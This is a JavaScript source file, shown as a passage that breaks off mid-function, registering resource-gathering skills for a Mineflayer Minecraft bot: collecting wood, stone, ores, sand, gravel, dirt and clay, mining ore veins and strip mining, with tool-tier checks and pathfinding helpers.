import { skillRegistry } from './registry.js'
import { logger } from '../utils/logger.js'
import pathfinderPackage from 'mineflayer-pathfinder'
import { Vec3 } from 'vec3'
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

const { goals: { GoalGetToBlock, GoalBlock, GoalNear } } = pathfinderPackage

const log = logger.child({ component: 'ResourceGathering' })

// ─── Helpers ───────────────────────────────────────────────────────────────────

/**
 * Tool tiers ordered from best to worst.
 */
const TOOL_TIERS = ['netherite', 'diamond', 'iron', 'stone', 'wooden']

/**
 * Tool type mapping for block categories.
 */
const TOOL_FOR_CATEGORY = {
  pickaxe: [
    'stone', 'cobblestone', 'deepslate', 'cobbled_deepslate', 'andesite',
    'diorite', 'granite', 'coal_ore', 'deepslate_coal_ore', 'iron_ore',
    'deepslate_iron_ore', 'copper_ore', 'deepslate_copper_ore', 'gold_ore',
    'deepslate_gold_ore', 'redstone_ore', 'deepslate_redstone_ore',
    'lapis_ore', 'deepslate_lapis_ore', 'diamond_ore', 'deepslate_diamond_ore',
    'emerald_ore', 'deepslate_emerald_ore', 'nether_quartz_ore', 'nether_gold_ore',
    'obsidian', 'netherrack', 'basalt', 'blackstone',
  ],
  axe: [
    'oak_log', 'birch_log', 'spruce_log', 'jungle_log', 'acacia_log',
    'dark_oak_log', 'mangrove_log', 'cherry_log', 'oak_planks', 'birch_planks',
    'spruce_planks', 'jungle_planks', 'acacia_planks', 'dark_oak_planks',
    'oak_wood', 'birch_wood', 'spruce_wood', 'jungle_wood', 'acacia_wood',
    'dark_oak_wood', 'crafting_table', 'chest', 'barrel',
  ],
  shovel: [
    'dirt', 'grass_block', 'sand', 'red_sand', 'gravel', 'clay',
    'soul_sand', 'soul_soil', 'mycelium', 'podzol', 'coarse_dirt',
    'rooted_dirt', 'mud', 'farmland', 'dirt_path',
  ],
}

/**
 * Minimum pickaxe tier required to mine specific ores.
 */
const ORE_TOOL_REQUIREMENTS = {
  coal:     'wooden_pickaxe',
  iron:     'stone_pickaxe',
  copper:   'stone_pickaxe',
  gold:     'iron_pickaxe',
  redstone: 'iron_pickaxe',
  lapis:    'iron_pickaxe',
  diamond:  'iron_pickaxe',
  emerald:  'iron_pickaxe',
}

/**
 * Minimum pickaxe tier index for ore mining. Lower index = higher tier.
 */
const TIER_RANK = { netherite: 0, diamond: 1, iron: 2, stone: 3, wooden: 4 }

/**
 * The minimum tier rank a pickaxe must have for each ore type.
 * E.g. diamond needs iron_pickaxe (rank 2) or better.
 */
const ORE_MIN_TIER_RANK = {
  coal:     4, // wooden or better
  iron:     3, // stone or better
  copper:   3,
  gold:     2, // iron or better
  redstone: 2,
  lapis:    2,
  diamond:  2,
  emerald:  2,
}

/**
 * Suggested Y-levels for ore searching.
 */
const ORE_Y_LEVELS = {
  coal:     { min: 0, max: 320 },
  iron:     { min: -64, max: 320 },
  copper:   { min: -16, max: 112 },
  gold:     { min: -64, max: 32 },
  redstone: { min: -64, max: 16 },
  lapis:    { min: -64, max: 64 },
  diamond:  { min: -64, max: 16 },
  emerald:  { min: -16, max: 320 },
}

/**
 * Determine which tool type is best for a given block name.
 * @param {string} blockName
 * @returns {'pickaxe'|'axe'|'shovel'|null}
 */
function getToolTypeForBlock(blockName) {
  for (const [toolType, blocks] of Object.entries(TOOL_FOR_CATEGORY)) {
    if (blocks.includes(blockName)) return toolType
  }
  return null
}

/**
 * Wait for drops to spawn then walk to the mined position to collect them.
 * @param {import('mineflayer').Bot} bot
 * @param {Vec3} position
 * @param {number} timeoutMs
 */
async function collectDrops(bot, position, timeoutMs = 3000) {
  await new Promise(r => setTimeout(r, 500))
  try {
    const goal = new GoalNear(position.x, position.y, position.z, 1)
    bot.pathfinder.setGoal(goal)
    await new Promise((resolve, reject) => {
      const timeout = setTimeout(() => {
        bot.pathfinder.setGoal(null)
        resolve()
      }, timeoutMs)
      bot.once('goal_reached', () => {
        clearTimeout(timeout)
        resolve()
      })
    })
  } catch {
    // Best effort — items auto-collect when nearby
  }
  // Small wait for item pickup
  await new Promise(r => setTimeout(r, 300))
}

/**
 * Navigate to a block position using pathfinder.
 * Resolves when the bot reaches the goal or times out.
 * @param {import('mineflayer').Bot} bot
 * @param {Vec3} position
 * @param {number} timeoutMs
 * @returns {Promise<boolean>} true if reached
 */
async function navigateTo(bot, position, timeoutMs = 15000) {
  return new Promise((resolve) => {
    const goal = new GoalGetToBlock(position.x, position.y, position.z)
    bot.pathfinder.setGoal(goal)

    const timeout = setTimeout(() => {
      bot.pathfinder.setGoal(null)
      bot.removeListener('goal_reached', onReach)
      bot.removeListener('path_update', onStuck)
      resolve(false)
    }, timeoutMs)

    function onReach() {
      clearTimeout(timeout)
      bot.removeListener('path_update', onStuck)
      resolve(true)
    }

    function onStuck(result) {
      if (result.status === 'noPath') {
        clearTimeout(timeout)
        bot.removeListener('goal_reached', onReach)
        bot.pathfinder.setGoal(null)
        resolve(false)
      }
    }

    bot.once('goal_reached', onReach)
    bot.on('path_update', onStuck)
  })
}

/**
 * Equip the best available tool of a given type from inventory.
 * @param {import('mineflayer').Bot} bot
 * @param {'pickaxe'|'axe'|'shovel'} toolType
 * @returns {Promise<import('prismarine-item').Item|null>} equipped item or null
 */
async function equipBestToolOfType(bot, toolType) {
  const items = bot.inventory.items()
  let bestItem = null
  let bestRank = Infinity

  for (const item of items) {
    for (const tier of TOOL_TIERS) {
      if (item.name === `${tier}_${toolType}`) {
        const rank = TIER_RANK[tier]
        if (rank < bestRank) {
          bestRank = rank
          bestItem = item
        }
        break
      }
    }
  }

  if (bestItem) {
    await bot.equip(bestItem, 'hand')
    return bestItem
  }
  return null
}

/**
 * Equip the best tool for mining a specific block.
 * Falls back to bare hand if no tool is found.
 * @param {import('mineflayer').Bot} bot
 * @param {string} blockName
 * @returns {Promise<import('prismarine-item').Item|null>}
 */
async function equipBestToolForBlock(bot, blockName) {
  const toolType = getToolTypeForBlock(blockName)
  if (!toolType) return null
  return equipBestToolOfType(bot, toolType)
}

/**
 * Check if bot has a pickaxe at or above the required tier for an ore.
 * @param {import('mineflayer').Bot} bot
 * @param {string} oreType coal|iron|copper|gold|redstone|lapis|diamond|emerald
 * @returns {{ hasTool: boolean, bestPickaxe: string|null, requiredTool: string }}
 */
function checkPickaxeForOre(bot, oreType) {
  const requiredTool = ORE_TOOL_REQUIREMENTS[oreType]
  const minRank = ORE_MIN_TIER_RANK[oreType]
  const items = bot.inventory.items()

  let bestPickaxe = null
  let bestRank = Infinity

  for (const item of items) {
    for (const tier of TOOL_TIERS) {
      if (item.name === `${tier}_pickaxe`) {
        const rank = TIER_RANK[tier]
        if (rank < bestRank) {
          bestRank = rank
          bestPickaxe = item.name
        }
        break
      }
    }
  }

  return {
    hasTool: bestRank <= minRank,
    bestPickaxe,
    requiredTool,
  }
}

/**
 * Count items in inventory matching a given name.
 * @param {import('mineflayer').Bot} bot
 * @param {string} itemName
 * @returns {number}
 */
function countInventoryItem(bot, itemName) {
  return bot.inventory.items()
    .filter(item => item.name === itemName)
    .reduce((sum, item) => sum + item.count, 0)
}

/**
 * Find blocks by name within a search radius.
 * @param {import('mineflayer').Bot} bot
 * @param {object} mcData minecraft-data instance
 * @param {string} blockName
 * @param {number} maxDistance
 * @param {number} count
 * @returns {Vec3[]}
 */
function findBlocks(bot, mcData, blockName, maxDistance = 64, count = 32) {
  const blockType = mcData.blocksByName[blockName]
  if (!blockType) return []
  return bot.findBlocks({
    matching: blockType.id,
    maxDistance,
    count,
  })
}

/**
 * Dig a block safely with error handling.
 * @param {import('mineflayer').Bot} bot
 * @param {import('prismarine-block').Block} block
 * @returns {Promise<boolean>}
 */
async function digBlock(bot, block) {
  if (!block || block.name === 'air') return false
  try {
    if (bot.canDigBlock(block)) {
      await bot.dig(block, true)
      return true
    }
  } catch (err) {
    log.warn({ err: err.message, block: block.name, pos: block.position }, 'Failed to dig block')
  }
  return false
}

// ─── Skills ────────────────────────────────────────────────────────────────────

// 1. collect_wood
skillRegistry.register({
  id: 'collect_wood',
  name: 'Collect Wood',
  category: 'resource_gathering',
  description: 'Find and chop a specified type of wood log. Navigates to trees, chops all connected logs (including up the trunk), and collects the drops.',
  arguments: {
    woodType: { type: 'string', enum: ['oak', 'birch', 'spruce', 'jungle', 'acacia', 'dark_oak'], default: 'oak' },
    quantity: { type: 'number', default: 16, min: 1, max: 256 },
  },
  requires: [],
  permissions: ['*'],
  timeout: 120_000,
  execute: async (bot, args, context) => {
    const woodType = args.woodType || 'oak'
    const quantity = args.quantity || 16
    const mcData = context?.mcData ?? bot.registry
    const requestedLog = `${woodType}_log`
    const logNames = Object.keys(mcData?.blocksByName ?? {})
      .filter((name) => name.endsWith('_log') || name.endsWith('_stem'))
      .concat(['oak_log', 'birch_log', 'spruce_log', 'jungle_log', 'acacia_log', 'dark_oak_log', 'mangrove_log', 'cherry_log', 'crimson_stem', 'warped_stem'])
      .filter((name, index, all) => all.indexOf(name) === index)
    const requestedNames = logNames.filter((name) => name === requestedLog)
    const searchableLogs = requestedNames.length ? requestedNames.concat(logNames.filter((name) => name !== requestedLog)) : logNames
    const countLogs = () => searchableLogs.reduce((total, name) => total + countInventoryItem(bot, name), 0)

    const startCount = countLogs()
    if (startCount >= quantity) {
      return {
        success: true,
        collected: 0,
        existing: startCount,
        requested: quantity,
        itemName: requestedLog,
        message: `Already have ${startCount} usable logs/stems`,
      }
    }
    let collected = 0

    // Let pathfinder dig and climb while approaching trees. This prevents a
    // shallow pit from turning a valid tree search into a false zero result.
    const movements = bot.pathfinder?.movements
    if (movements) movements.canDig = true

    for (let attempt = 0; attempt < 3 && collected < quantity; attempt++) {
      const radius = 64 + attempt * 64
      let positions = searchableLogs.flatMap((name) => findBlocks(bot, mcData, name, radius, 24))
      if (positions.length === 0) {
        // Bounded exploration fallback: move to a nearby ring and rescan.
        const p = bot.entity.position
        const explore = new GoalNear(Math.round(p.x + 24 * (attempt + 1)), p.y, Math.round(p.z + 16), 3)
        bot.pathfinder?.setGoal(explore)
        await new Promise(resolve => setTimeout(resolve, 1500))
        positions = searchableLogs.flatMap((name) => findBlocks(bot, mcData, name, radius, 24))
        if (positions.length === 0) continue
      }

      // Sort by distance
      const botPos = bot.entity.position
      positions.sort((a, b) => botPos.distanceTo(a) - botPos.distanceTo(b))

      for (const pos of positions) {
        if (collected >= quantity) break

        // Navigate to the base log
        const reached = await navigateTo(bot, pos, 6000)
        if (!reached) continue

        // Equip best axe (or bare hand)
        const targetBlock = bot.blockAt(pos)
        const targetName = targetBlock?.name ?? requestedLog
        await equipBestToolForBlock(bot, targetName)

        // Mine this log and all connected logs above it (tree trunk)
        let currentPos = pos.clone()
        const maxHeight = 30 // max tree height to check

        for (let dy = 0; dy < maxHeight; dy++) {
          const checkPos = currentPos.offset(0, dy, 0)
          const block = bot.blockAt(checkPos)
          if (!block || !(block.name.endsWith('_log') || block.name.endsWith('_stem'))) break

          // Navigate close enough if needed
          if (bot.entity.position.distanceTo(checkPos) > 5) {
            await navigateTo(bot, checkPos, 4000)
          }

          await equipBestToolForBlock(bot, block.name)
          const dug = await digBlock(bot, block)
          if (dug) {
            collected++
            await collectDrops(bot, checkPos, 2000)
          }

          if (collected >= quantity) break
        }
      }
    }

    const endCount = countLogs()
    const actualCollected = endCount - startCount

    return {
      success: endCount >= quantity,
      collected: actualCollected,
      existing: startCount,
      requested: quantity,
      itemName: requestedLog,
      message: actualCollected >= quantity
        ? `Collected ${actualCollected} usable logs/stems`
        : `Could only collect ${actualCollected}/${quantity} usable logs/stems`,
    }
  },
  verify: async (bot, args, context) => {
    const quantity = args.quantity || 16
    const names = Object.keys(context?.mcData?.blocksByName ?? {}).filter((name) => name.endsWith('_log') || name.endsWith('_stem'))
      .concat(['oak_log', 'birch_log', 'spruce_log', 'jungle_log', 'acacia_log', 'dark_oak_log', 'mangrove_log', 'cherry_log', 'crimson_stem', 'warped_stem'])
      .filter((name, index, all) => all.indexOf(name) === index)
    const count = names.reduce((total, name) => total + countInventoryItem(bot, name), 0)
    return { verified: count >= quantity, current: count, required: quantity }
  },
})

// 2. collect_stone
skillRegistry.register({
  id: 'collect_stone',
  name: 'Collect Stone',
  category: 'resource_gathering',
  description: 'Mine stone blocks to get cobblestone. Requires at least a wooden pickaxe.',
  arguments: {
    quantity: { type: 'number', default: 16, min: 1, max: 256 },
  },
  requires: [],
  permissions: ['*'],
  timeout: 120_000,
  execute: async (bot, args, context) => {
    const quantity = args.quantity || 16
    const mcData = context.mcData

    // Check for pickaxe
    const equipped = await equipBestToolOfType(bot, 'pickaxe')
    if (!equipped) {
      return { success: false, message: 'No pickaxe available. Craft at least a wooden_pickaxe first.' }
    }

    const startCount = countInventoryItem(bot, 'cobblestone')
    let mined = 0

    for (let attempt = 0; attempt < 15 && mined < quantity; attempt++) {
      // Search for stone, cobblestone, or deepslate
      let positions = findBlocks(bot, mcData, 'stone', 48, 32)
      if (positions.length === 0) {
        positions = findBlocks(bot, mcData, 'deepslate', 48, 32)
      }
      if (positions.length === 0) {
        log.info('No stone found nearby')
        break
      }

      const botPos = bot.entity.position
      positions.sort((a, b) => botPos.distanceTo(a) - botPos.distanceTo(b))

      for (const pos of positions) {
        if (mined >= quantity) break

        const reached = await navigateTo(bot, pos)
        if (!reached) continue

        await equipBestToolOfType(bot, 'pickaxe')
        const block = bot.blockAt(pos)
        if (block && (block.name === 'stone' || block.name === 'deepslate')) {
          const dug = await digBlock(bot, block)
          if (dug) {
            mined++
            await collectDrops(bot, pos, 1500)
          }
        }
      }
    }

    const endCount = countInventoryItem(bot, 'cobblestone')
    const actualMined = endCount - startCount

    return {
      success: actualMined > 0,
      collected: actualMined,
      requested: quantity,
      itemName: 'cobblestone',
      message: actualMined >= quantity
        ? `Mined ${actualMined} cobblestone`
        : `Could only mine ${actualMined}/${quantity} cobblestone`,
    }
  },
  verify: async (bot, args) => {
    const quantity = args.quantity || 16
    const count = countInventoryItem(bot, 'cobblestone')
    return { verified: count >= quantity, current: count, required: quantity }
  },
})

// 3. collect_ore
skillRegistry.register({
  id: 'collect_ore',
  name: 'Collect Ore',
  category: 'resource_gathering',
  description: 'Mine a specific ore type. Checks tool requirements before mining and searches at appropriate Y levels.',
  arguments: {
    ore: { type: 'string', enum: ['coal', 'iron', 'copper', 'gold', 'redstone', 'lapis', 'diamond', 'emerald'], required: true },
    quantity: { type: 'number', default: 8, min: 1, max: 128 },
  },
  requires: [],
  permissions: ['*'],
  timeout: 180_000,
  execute: async (bot, args, context) => {
    const ore = args.ore
    const quantity = args.quantity || 8
    const mcData = context.mcData

    if (!ore || !ORE_TOOL_REQUIREMENTS[ore]) {
      return { success: false, message: `Unknown ore type: ${ore}` }
    }

    // Check tool requirements
    let toolCheck = checkPickaxeForOre(bot, ore)
    if (!toolCheck.hasTool) {
      // Iron/copper mining can self-heal the common missing-prerequisite case.
      // The nested craft operation still verifies inventory and equipment.
      if (['iron', 'copper'].includes(ore)) {
        const craftResult = await skillRegistry.get('craft_stone_tools')?.execute(bot, { tool: 'stone_pickaxe' }, context)
        toolCheck = checkPickaxeForOre(bot, ore)
        if (!toolCheck.hasTool) {
          return { success: false, error: `TOOL_REQUIREMENT_FAILURE: Need ${toolCheck.requiredTool} or better to mine ${ore}_ore; crafting result: ${craftResult?.error ?? 'stone pickaxe was not produced'}`, requiredTool: toolCheck.requiredTool, bestPickaxe: toolCheck.bestPickaxe || null }
        }
      }
    }
    if (!toolCheck.hasTool) {
      return {
        success: false,
        error: `TOOL_REQUIREMENT_FAILURE: Need ${toolCheck.requiredTool} or better to mine ${ore}_ore. Best pickaxe: ${toolCheck.bestPickaxe || 'none'}`,
        requiredTool: toolCheck.requiredTool,
      }
    }

    // Determine ore block names (regular + deepslate variant)
    const oreBlockName = `${ore}_ore`
    const deepslateOreBlockName = `deepslate_${ore}_ore`

    // Determine expected drop item
    const dropItems = {
      coal: 'coal',
      iron: 'raw_iron',
      copper: 'raw_copper',
      gold: 'raw_gold',
      redstone: 'redstone',
      lapis: 'lapis_lazuli',
      diamond: 'diamond',
      emerald: 'emerald',
    }
    const dropItem = dropItems[ore]

    const startCount = countInventoryItem(bot, dropItem)
    let mined = 0

    for (let attempt = 0; attempt < 20 && mined < quantity; attempt++) {
      // Search for both regular and deepslate variants
      let positions = findBlocks(bot, mcData, oreBlockName, 64, 16)
      const deepPositions = findBlocks(bot, mcData, deepslateOreBlockName, 64, 16)
      positions = positions.concat(deepPositions)

      if (positions.length === 0) {
        log.info({ ore }, 'No ore blocks found nearby')
        break
      }

      const botPos = bot.entity.position
      positions.sort((a, b) => botPos.distanceTo(a) - botPos.distanceTo(b))

      for (const pos of positions) {
        if (mined >= quantity) break

        const reached = await navigateTo(bot, pos)
        if (!reached) continue

        // Equip and verify the required pickaxe immediately before digging.
        const equipped = await equipBestToolOfType(bot, 'pickaxe')
        const finalToolCheck = checkPickaxeForOre(bot, ore)
        if (!equipped || !finalToolCheck.hasTool || !ORE_MIN_TIER_RANK[ore] || !bot.heldItem?.name?.endsWith('_pickaxe')) {
          return { success: false, error: `TOOL_REQUIREMENT_FAILURE: required ${finalToolCheck.requiredTool}; equipped ${bot.heldItem?.name ?? 'nothing'}` }
        }

        const block = bot.blockAt(pos)
        if (block && (block.name === oreBlockName || block.name === deepslateOreBlockName)) {
          const dug = await digBlock(bot, block)
          if (dug) {
            mined++
            await collectDrops(bot, pos, 2000)
          }
        }
      }
    }

    const endCount = countInventoryItem(bot, dropItem)
    const actualMined = endCount - startCount

    return {
      success: actualMined > 0,
      collected: actualMined,
      requested: quantity,
      itemName: dropItem,
      oreType: ore,
      message: actualMined >= quantity
        ? `Collected ${actualMined} ${dropItem}`
        : `Could only collect ${actualMined}/${quantity} ${dropItem}`,
    }
  },
  verify: async (bot, args) => {
    const dropItems = {
      coal: 'coal', iron: 'raw_iron', copper: 'raw_copper', gold: 'raw_gold',
      redstone: 'redstone', lapis: 'lapis_lazuli', diamond: 'diamond', emerald: 'emerald',
    }
    const dropItem = dropItems[args.ore]
    const quantity = args.quantity || 8
    const count = countInventoryItem(bot, dropItem)
    return { verified: count >= quantity, current: count, required: quantity }
  },
})

// 4. collect_sand
skillRegistry.register({
  id: 'collect_sand',
  name: 'Collect Sand',
  category: 'resource_gathering',
  description: 'Dig sand blocks. Uses a shovel if available for faster mining.',
  arguments: {
    quantity: { type: 'number', default: 16, min: 1, max: 256 },
  },
  requires: [],
  permissions: ['*'],
  timeout: 120_000,
  execute: async (bot, args, context) => {
    const quantity = args.quantity || 16
    const mcData = context.mcData

    const startCount = countInventoryItem(bot, 'sand')
    let mined = 0

    for (let attempt = 0; attempt < 15 && mined < quantity; attempt++) {
      const positions = findBlocks(bot, mcData, 'sand', 64, 32)
      if (positions.length === 0) {
        log.info('No sand found nearby')
        break
      }

      const botPos = bot.entity.position
      positions.sort((a, b) => botPos.distanceTo(a) - botPos.distanceTo(b))

      for (const pos of positions) {
        if (mined >= quantity) break

        const reached = await navigateTo(bot, pos)
        if (!reached) continue

        // Equip shovel if available
        await equipBestToolOfType(bot, 'shovel')

        const block = bot.blockAt(pos)
        if (block && block.name === 'sand') {
          const dug = await digBlock(bot, block)
          if (dug) {
            mined++
            await collectDrops(bot, pos, 1500)
          }
        }
      }
    }

    const endCount = countInventoryItem(bot, 'sand')
    const actualMined = endCount - startCount

    return {
      success: actualMined > 0,
      collected: actualMined,
      requested: quantity,
      itemName: 'sand',
      message: actualMined >= quantity
        ? `Collected ${actualMined} sand`
        : `Could only collect ${actualMined}/${quantity} sand`,
    }
  },
})

// 5. collect_gravel
skillRegistry.register({
  id: 'collect_gravel',
  name: 'Collect Gravel',
  category: 'resource_gathering',
  description: 'Dig gravel blocks. Uses a shovel if available for faster mining.',
  arguments: {
    quantity: { type: 'number', default: 16, min: 1, max: 256 },
  },
  requires: [],
  permissions: ['*'],
  timeout: 120_000,
  execute: async (bot, args, context) => {
    const quantity = args.quantity || 16
    const mcData = context.mcData

    const startCount = countInventoryItem(bot, 'gravel')
    let mined = 0

    for (let attempt = 0; attempt < 15 && mined < quantity; attempt++) {
      const positions = findBlocks(bot, mcData, 'gravel', 64, 32)
      if (positions.length === 0) {
        log.info('No gravel found nearby')
        break
      }

      const botPos = bot.entity.position
      positions.sort((a, b) => botPos.distanceTo(a) - botPos.distanceTo(b))

      for (const pos of positions) {
        if (mined >= quantity) break

        const reached = await navigateTo(bot, pos)
        if (!reached) continue

        await equipBestToolOfType(bot, 'shovel')

        const block = bot.blockAt(pos)
        if (block && block.name === 'gravel') {
          const dug = await digBlock(bot, block)
          if (dug) {
            mined++
            await collectDrops(bot, pos, 1500)
          }
        }
      }
    }

    const endCount = countInventoryItem(bot, 'gravel')
    const actualMined = endCount - startCount

    return {
      success: actualMined > 0,
      collected: actualMined,
      requested: quantity,
      itemName: 'gravel',
      message: actualMined >= quantity
        ? `Collected ${actualMined} gravel`
        : `Could only collect ${actualMined}/${quantity} gravel`,
    }
  },
})

// 6. collect_dirt
skillRegistry.register({
  id: 'collect_dirt',
  name: 'Collect Dirt',
  category: 'resource_gathering',
  description: 'Dig dirt blocks. Uses a shovel if available for faster mining.',
  arguments: {
    quantity: { type: 'number', default: 16, min: 1, max: 256 },
  },
  requires: [],
  permissions: ['*'],
  timeout: 120_000,
  execute: async (bot, args, context) => {
    const quantity = args.quantity || 16
    const mcData = context.mcData

    const startCount = countInventoryItem(bot, 'dirt')
    let mined = 0

    for (let attempt = 0; attempt < 15 && mined < quantity; attempt++) {
      // Search for both dirt and grass_block (drops dirt)
      let positions = findBlocks(bot, mcData, 'dirt', 64, 32)
      const grassPositions = findBlocks(bot, mcData, 'grass_block', 64, 16)
      positions = positions.concat(grassPositions)

      if (positions.length === 0) {
        log.info('No dirt found nearby')
        break
      }

      const botPos = bot.entity.position
      positions.sort((a, b) => botPos.distanceTo(a) - botPos.distanceTo(b))

      for (const pos of positions) {
        if (mined >= quantity) break

        const reached = await navigateTo(bot, pos)
        if (!reached) continue

        await equipBestToolOfType(bot, 'shovel')

        const block = bot.blockAt(pos)
        if (block && (block.name === 'dirt' || block.name === 'grass_block')) {
          const dug = await digBlock(bot, block)
          if (dug) {
            mined++
            await collectDrops(bot, pos, 1500)
          }
        }
      }
    }

    const endCount = countInventoryItem(bot, 'dirt')
    const actualMined = endCount - startCount

    return {
      success: actualMined > 0,
      collected: actualMined,
      requested: quantity,
      itemName: 'dirt',
      message: actualMined >= quantity
        ? `Collected ${actualMined} dirt`
        : `Could only collect ${actualMined}/${quantity} dirt`,
    }
  },
})

// 7. collect_clay
skillRegistry.register({
  id: 'collect_clay',
  name: 'Collect Clay',
  category: 'resource_gathering',
  description: 'Dig clay blocks, typically found near water. Uses a shovel if available.',
  arguments: {
    quantity: { type: 'number', default: 16, min: 1, max: 256 },
  },
  requires: [],
  permissions: ['*'],
  timeout: 120_000,
  execute: async (bot, args, context) => {
    const quantity = args.quantity || 16
    const mcData = context.mcData

    // Clay blocks drop 4 clay balls each
    const startCount = countInventoryItem(bot, 'clay_ball')
    let mined = 0

    for (let attempt = 0; attempt < 15 && mined < quantity; attempt++) {
      const positions = findBlocks(bot, mcData, 'clay', 64, 32)
      if (positions.length === 0) {
        log.info('No clay found nearby')
        break
      }

      const botPos = bot.entity.position
      positions.sort((a, b) => botPos.distanceTo(a) - botPos.distanceTo(b))

      for (const pos of positions) {
        if (mined >= quantity) break

        const reached = await navigateTo(bot, pos)
        if (!reached) continue

        await equipBestToolOfType(bot, 'shovel')

        const block = bot.blockAt(pos)
        if (block && block.name === 'clay') {
          const dug = await digBlock(bot, block)
          if (dug) {
            mined++
            await collectDrops(bot, pos, 2000)
          }
        }
      }
    }

    const endCount = countInventoryItem(bot, 'clay_ball')
    const actualMined = endCount - startCount

    return {
      success: actualMined > 0,
      collected: actualMined,
      blocksMined: mined,
      requested: quantity,
      itemName: 'clay_ball',
      message: mined >= quantity
        ? `Mined ${mined} clay blocks (got ${actualMined} clay balls)`
        : `Could only mine ${mined}/${quantity} clay blocks (got ${actualMined} clay balls)`,
    }
  },
})

// 8. mine_vein
skillRegistry.register({
  id: 'mine_vein',
  name: 'Mine Vein',
  category: 'resource_gathering',
  description: 'Mine an entire ore vein starting from a known block position. Uses BFS to find and mine all connected blocks of the same type.',
  arguments: {
    position: { type: 'object', properties: { x: 'number', y: 'number', z: 'number' }, required: true },
    oreType: { type: 'string', required: true },
  },
  requires: [],
  permissions: ['*'],
  timeout: 120_000,
  execute: async (bot, args, context) => {
    const { position, oreType } = args
    if (!position || !oreType) {
      return { success: false, message: 'position and oreType are required' }
    }

    const startPos = new Vec3(position.x, position.y, position.z)
    const mcData = context.mcData
    const blockType = mcData.blocksByName[oreType]
    if (!blockType) {
      return { success: false, message: `Unknown block type: ${oreType}` }
    }

    // BFS to find all connected blocks of the same type
    const visited = new Set()
    const queue = [startPos]
    const veinBlocks = []

    const posKey = (p) => `${p.x},${p.y},${p.z}`

    while (queue.length > 0) {
      const pos = queue.shift()
      const key = posKey(pos)
      if (visited.has(key)) continue
      visited.add(key)

      const block = bot.blockAt(pos)
      if (!block || block.name !== oreType) continue

      veinBlocks.push(pos.clone())

      // Check all 6 adjacent faces
      const offsets = [
        [1, 0, 0], [-1, 0, 0],
        [0, 1, 0], [0, -1, 0],
        [0, 0, 1], [0, 0, -1],
      ]
      for (const [dx, dy, dz] of offsets) {
        const neighbor = pos.offset(dx, dy, dz)
        if (!visited.has(posKey(neighbor))) {
          queue.push(neighbor)
        }
      }
    }

    if (veinBlocks.length === 0) {
      return { success: false, message: `No ${oreType} found at position`, mined: 0 }
    }

    log.info({ oreType, veinSize: veinBlocks.length }, 'Found ore vein')

    // Mine all blocks in the vein
    let mined = 0
    for (const pos of veinBlocks) {
      const reached = await navigateTo(bot, pos, 10000)
      if (!reached) continue

      await equipBestToolForBlock(bot, oreType)

      const block = bot.blockAt(pos)
      if (block && block.name === oreType) {
        const dug = await digBlock(bot, block)
        if (dug) {
          mined++
          await collectDrops(bot, pos, 1500)
        }
      }
    }

    return {
      success: mined > 0,
      mined,
      veinSize: veinBlocks.length,
      oreType,
      message: `Mined ${mined}/${veinBlocks.length} blocks of ${oreType}`,
    }
  },
})

// 9. strip_mine
skillRegistry.register({
  id: 'strip_mine',
  name: 'Strip Mine',
  category: 'resource_gathering',
  description: 'Create a 1x2 strip mine tunnel in a specified direction. Checks walls for exposed ores and mines them. Places torches every 8 blocks if available.',
  arguments: {
    direction: { type: 'string', enum: ['north', 'south', 'east', 'west'], required: true },
    length: { type: 'number', default: 32, min: 4, max: 128 },
    yLevel: { type: 'number', default: -59, min: -64, max: 320 },
  },
  requires: [],
  permissions: ['*'],
  timeout: 300_000,
  execute: async (bot, args, context) => {
    const direction = args.direction
    const length = args.length || 32
    const mcData = context.mcData

    // Direction vectors
    const dirVectors = {
      north: new Vec3(0, 0, -1),
      south: new Vec3(0, 0, 1),
      east: new Vec3(1, 0, 0),
      west: new Vec3(-1, 0, 0),
    }
    const dir = dirVectors[direction]
    if (!dir) {
      return { success: false, message: `Invalid direction: ${direction}` }
    }

    // Perpendicular directions for wall checks
    const perpDirs = direction === 'north' || direction === 'south'
      ? [new Vec3(1, 0, 0), new Vec3(-1, 0, 0)]
      : [new Vec3(0, 0, 1), new Vec3(0, 0, -1)]

    // Ore names to look for on walls
    const oreNames = new Set([
      'coal_ore', 'deepslate_coal_ore',
      'iron_ore', 'deepslate_iron_ore',
      'copper_ore', 'deepslate_copper_ore',
      'gold_ore', 'deepslate_gold_ore',
      'redstone_ore', 'deepslate_redstone_ore',
      'lapis_ore', 'deepslate_lapis_ore',
      'diamond_ore', 'deepslate_diamond_ore',
      'emerald_ore', 'deepslate_emerald_ore',
      'nether_quartz_ore', 'nether_gold_ore',
    ])

    const startPos = bot.entity.position.floored()
    const oresFound = []
    let blocksDug = 0

    // Check for pickaxe
    const equipped = await equipBestToolOfType(bot, 'pickaxe')
    if (!equipped) {
      return { success: false, message: 'No pickaxe available for strip mining' }
    }

    for (let i = 0; i < length; i++) {
      const lowerPos = startPos.plus(dir.scaled(i + 1))
      const upperPos = lowerPos.offset(0, 1, 0)

      // Dig the lower block
      await equipBestToolOfType(bot, 'pickaxe')
      const lowerBlock = bot.blockAt(lowerPos)
      if (lowerBlock && lowerBlock.name !== 'air') {
        const reached = await navigateTo(bot, lowerPos, 8000)
        if (!reached) {
          // Try digging from current position if close enough
          if (bot.entity.position.distanceTo(lowerPos) > 5) continue
        }
        await equipBestToolForBlock(bot, lowerBlock.name)
        if (await digBlock(bot, lowerBlock)) blocksDug++
      }

      // Dig the upper block
      const upperBlock = bot.blockAt(upperPos)
      if (upperBlock && upperBlock.name !== 'air') {
        await equipBestToolForBlock(bot, upperBlock.name)
        if (await digBlock(bot, upperBlock)) blocksDug++
      }

      // Walk into the tunnel
      await navigateTo(bot, lowerPos, 5000)

      // Check walls for ores (both sides, both heights)
      for (const perpDir of perpDirs) {
        for (let dy = 0; dy <= 1; dy++) {
          const wallPos = lowerPos.plus(perpDir).offset(0, dy, 0)
          const wallBlock = bot.blockAt(wallPos)
          if (wallBlock && oreNames.has(wallBlock.name)) {
            log.info({ ore: wallBlock.name, pos: wallPos }, 'Found ore in wall')
            oresFound.push({ name: wallBlock.name, position: { x: wallPos.x, y: wallPos.y, z: wallPos.z } })

            // Mine the ore
            await equipBestToolOfType(bot, 'pickaxe')
            if (await digBlock(bot, wallBlock)) {
              await collectDrops(bot, wallPos, 1500)
            }
          }
        }
      }

      // Also check floor and ceiling for ores
      for (const dy of [-1, 2]) {
        const checkPos = lowerPos.offset(0, dy, 0)
        const checkBlock = bot.blockAt(checkPos)
        if (checkBlock && oreNames.has(checkBlock.name)) {
